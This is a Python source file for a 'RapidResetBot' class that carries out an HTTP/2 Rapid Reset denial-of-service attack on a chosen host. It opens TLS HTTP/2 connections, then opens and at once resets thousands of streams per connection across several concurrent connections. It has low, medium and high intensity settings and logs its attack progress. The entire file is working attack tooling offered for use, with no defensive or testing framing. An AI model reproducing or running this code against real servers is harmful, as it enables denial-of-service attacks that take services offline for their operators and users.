import asyncio
import h2.connection
import h2.events
import ssl
import socket
import logging
from datetime import datetime
import json
import random

class RapidResetBot:
    def __init__(self, bot_id, target_host, target_port=443, attack_intensity="medium"):
        self.bot_id = bot_id
        self.target_host = target_host
        self.target_port = target_port
        self.attack_intensity = attack_intensity
        self.running = False
        self.streams_created = 0
        self.streams_reset = 0
        self.setup_logging()
        
        # Attack intensity configurations
        self.intensity_configs = {
            "low": {"streams_per_connection": 100, "reset_delay": 0.01},
            "medium": {"streams_per_connection": 1000, "reset_delay": 0.001},
            "high": {"streams_per_connection": 10000, "reset_delay": 0.0001}
        }
    
    def setup_logging(self):
        self.logger = logging.getLogger(f'rapid_reset_bot_{self.bot_id}')
        handler = logging.FileHandler(f'logs/attack_logs/rapid_reset_{self.bot_id}.log')
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
    
    async def create_connection(self):
        """Create HTTP/2 connection"""
        try:
            # Create TCP connection
            sock = socket.create_connection((self.target_host, self.target_port))
            
            # Wrap with SSL
            context = ssl.create_default_context()
            context.set_alpn_protocols(['h2'])
            sock = context.wrap_socket(sock, server_hostname=self.target_host)
            
            # Create HTTP/2 connection
            config = h2.config.H2Configuration(client_side=True)
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            sock.send(conn.data_to_send())
            
            return sock, conn
        
        except Exception as e:
            self.logger.error(f"Failed to create connection: {e}")
            return None, None
    
    async def execute_rapid_reset_attack(self):
        """Execute rapid reset attack pattern"""
        config = self.intensity_configs[self.attack_intensity]
        
        sock, conn = await self.create_connection()
        if not sock or not conn:
            return
        
        try:
            attack_start = datetime.now()
            
            for i in range(config["streams_per_connection"]):
                if not self.running:
                    break
                
                # Create stream
                headers = [
                    (':method', 'GET'),
                    (':path', f'/attack-target-{i}'),
                    (':scheme', 'https'),
                    (':authority', self.target_host),
                ]
                
                stream_id = conn.get_next_available_stream_id()
                conn.send_headers(stream_id, headers)
                sock.send(conn.data_to_send())
                
                self.streams_created += 1
                
                # Immediately reset stream
                await asyncio.sleep(config["reset_delay"])
                conn.reset_stream(stream_id)
                sock.send(conn.data_to_send())
                
                self.streams_reset += 1
                
                # Log every 100 streams
                if i % 100 == 0:
                    log_data = {
                        "bot_id": self.bot_id,
                        "bot_type": "rapid_reset_attack",
                        "timestamp": datetime.now().isoformat(),
                        "target": f"{self.target_host}:{self.target_port}",
                        "streams_created": self.streams_created,
                        "streams_reset": self.streams_reset,
                        "attack_duration": (datetime.now() - attack_start).total_seconds(),
                        "intensity": self.attack_intensity
                    }
                    self.logger.info(json.dumps(log_data))
        
        except Exception as e:
            self.logger.error(f"Attack execution failed: {e}")
        
        finally:
            try:
                sock.close()
            except:
                pass
    
    async def run(self, duration=300):
        """Run attack for specified duration"""
        self.running = True
        self.logger.info(f"Starting rapid reset attack bot {self.bot_id}")
        
        end_time = asyncio.get_event_loop().time() + duration
        
        # Multiple concurrent connections
        tasks = []
        connection_count = 5 if self.attack_intensity == "high" else 3
        
        for _ in range(connection_count):
            task = asyncio.create_task(self.execute_rapid_reset_attack())
            tasks.append(task)
        
        # Run until duration expires
        await asyncio.sleep(duration)
        self.running = False
        
        # Wait for all tasks to complete
        await asyncio.gather(*tasks, return_exceptions=True)
        
        self.logger.info(f"Attack completed. Streams created: {self.streams_created}, Reset: {self.streams_reset}")
